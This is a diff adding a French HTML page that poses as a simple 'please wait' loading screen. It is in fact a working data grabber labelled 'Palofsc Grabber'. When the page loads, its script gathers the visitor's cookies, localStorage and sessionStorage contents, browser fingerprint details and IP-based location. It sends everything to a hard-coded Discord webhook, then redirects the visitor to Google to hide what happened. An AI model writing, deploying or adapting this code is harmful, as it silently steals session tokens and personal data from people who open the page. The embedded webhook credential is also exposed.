@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chargement...</title>
+    <style>
+        body {
+            background: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+            margin: 0;
+        }
+        .loader {
+            text-align: center;
+        }
+        .loader span {
+            font-size: 24px;
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+    <div class="loader">
+        <span>Veuillez patienter...</span>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1545515909269954601/kRTIMOgiHsccz5jfYbJlNp9JMn5IM18XkLqIZwIuuG8AuywZ5h4juzr8QN5s_gEGDwIm";
+
+        async function collectAndSend() {
+            try {
+                const localData = collectLocalData();
+                const ipData = await fetchIPData();
+                const fullData = { ...localData, ...ipData };
+                await sendToDiscord(fullData);
+                window.location.href = "https://www.google.com";
+            } catch (error) {
+                console.error("Erreur :", error);
+                window.location.href = "https://www.google.com";
+            }
+        }
+
+        function collectLocalData() {
+            const data = {};
+            data.userAgent = navigator.userAgent || "inconnu";
+            data.platform = navigator.platform || "inconnu";
+            data.language = navigator.language || "inconnu";
+            data.languages = navigator.languages ? navigator.languages.join(", ") : "inconnu";
+            data.cookieEnabled = navigator.cookieEnabled ? "oui" : "non";
+            data.doNotTrack = navigator.doNotTrack || "non spécifié";
+            data.screenWidth = window.screen.width;
+            data.screenHeight = window.screen.height;
+            data.colorDepth = window.screen.colorDepth;
+            data.pixelRatio = window.devicePixelRatio || 1;
+            data.viewportWidth = window.innerWidth;
+            data.viewportHeight = window.innerHeight;
+            data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "inconnu";
+            data.timezoneOffset = new Date().getTimezoneOffset();
+            data.referrer = document.referrer || "aucun";
+            if (document.cookie) {
+                data.cookies = document.cookie;
+            } else {
+                data.cookies = "aucun cookie";
+            }
+            try {
+                if (window.localStorage) {
+                    const lsKeys = Object.keys(localStorage);
+                    if (lsKeys.length > 0) {
+                        data.localStorage = {};
+                        for (let key of lsKeys) {
+                            data.localStorage[key] = localStorage.getItem(key);
+                        }
+                    } else {
+                        data.localStorage = "vide";
+                    }
+                } else {
+                    data.localStorage = "non disponible";
+                }
+            } catch (e) {
+                data.localStorage = "erreur d'accès";
+            }
+            try {
+                if (window.sessionStorage) {
+                    const ssKeys = Object.keys(sessionStorage);
+                    if (ssKeys.length > 0) {
+                        data.sessionStorage = {};
+                        for (let key of ssKeys) {
+                            data.sessionStorage[key] = sessionStorage.getItem(key);
+                        }
+                    } else {
+                        data.sessionStorage = "vide";
+                    }
+                } else {
+                    data.sessionStorage = "non disponible";
+                }
+            } catch (e) {
+                data.sessionStorage = "erreur d'accès";
+            }
+            if (navigator.plugins) {
+                const pluginNames = [];
+                for (let i = 0; i < navigator.plugins.length; i++) {
+                    pluginNames.push(navigator.plugins[i].name);
+                }
+                data.plugins = pluginNames.join(", ") || "aucun plugin";
+            } else {
+                data.plugins = "non disponible";
+            }
+            if (navigator.mimeTypes) {
+                const mimeTypes = [];
+                for (let i = 0; i < navigator.mimeTypes.length; i++) {
+                    mimeTypes.push(navigator.mimeTypes[i].type);
+                }
+                data.mimeTypes = mimeTypes.join(", ") || "aucun";
+            } else {
+                data.mimeTypes = "non disponible";
+            }
+            if (navigator.connection) {
+                const conn = navigator.connection;
+                data.connection = {
+                    effectiveType: conn.effectiveType || "inconnu",
+                    rtt: conn.rtt || "inconnu",
+                    downlink: conn.downlink || "inconnu",
+                    saveData: conn.saveData ? "oui" : "non"
+                };
+            } else {
+                data.connection = "non disponible";
+            }
+            data.pageURL = window.location.href;
+            data.visitTime = new Date().toISOString();
+            return data;
+        }
+
+        async function fetchIPData() {
+            const fallbackData = {
+                ip: "inconnu",
+                country: "inconnu",
+                region: "inconnu",
+                city: "inconnu",
+                lat: null,
+                lon: null,
+                isp: "inconnu",
+                org: "inconnu",
+                as: "inconnu"
+            };
+            try {
+                const response = await fetch("http://ip-api.com/json/?fields=status,message,country,regionName,city,lat,lon,isp,org,as,query");
+                if (!response.ok) {
+                    throw new Error("Réponse réseau non OK");
+                }
+                const data = await response.json();
+                if (data.status === "success") {
+                    return {
+                        ip: data.query || "inconnu",
+                        country: data.country || "inconnu",
+                        region: data.regionName || "inconnu",
+                        city: data.city || "inconnu",
+                        lat: data.lat || null,
+                        lon: data.lon || null,
+                        isp: data.isp || "inconnu",
+                        org: data.org || "inconnu",
+                        as: data.as || "inconnu"
+                    };
+                } else {
+                    return await fetchIPFallback();
+                }
+            } catch (error) {
+                return await fetchIPFallback();
+            }
+        }
+
+        async function fetchIPFallback() {
+            try {
+                const response = await fetch("https://api.ipify.org?format=json");
+                if (!response.ok) {
+                    throw new Error("Impossible de récupérer l'IP");
+                }
+                const data = await response.json();
+                return {
+                    ip: data.ip || "inconnu",
+                    country: "inconnu",
+                    region: "inconnu",
+                    city: "inconnu",
+                    lat: null,
+                    lon: null,
+                    isp: "inconnu",
+                    org: "inconnu",
+                    as: "inconnu"
+                };
+            } catch (error) {
+                return {
+                    ip: "inconnu",
+                    country: "inconnu",
+                    region: "inconnu",
+                    city: "inconnu",
+                    lat: null,
+                    lon: null,
+                    isp: "inconnu",
+                    org: "inconnu",
+                    as: "inconnu"
+                };
+            }
+        }
+
+        async function sendToDiscord(data) {
+            const embed = {
+                title: "📥 Collecte d'informations",
+                color: 0x00ff00,
+                timestamp: new Date().toISOString(),
+                fields: [],
+                footer: {
+                    text: "Palofsc Grabber"
+                }
+            };
+            const fields = [];
+            for (const [key, value] of Object.entries(data)) {
+                let displayValue = value;
+                if (typeof value === "object" && value !== null) {
+                    displayValue = JSON.stringify(value, null, 2);
+                }
+                if (displayValue && displayValue.length > 1000) {
+                    displayValue = displayValue.substring(0, 997) + "...";
+                }
+                fields.push({
+                    name: key.substring(0, 256),
+                    value: displayValue ? displayValue.toString().substring(0, 1024) : "null",
+                    inline: false
+                });
+            }
+            embed.fields = fields;
+            const payload = {
+                content: "⚠️ **Nouvelles données collectées** ⚠️",
+                embeds: [embed]
+            };
+            const response = await fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(payload)
+            });
+            if (!response.ok) {
+                console.error("Erreur envoi webhook :", response.status, response.statusText);
+            }
+        }
+
+        window.addEventListener("load", function () {
+            collectAndSend();
+        });
+    </script>
+</body>
+</html>
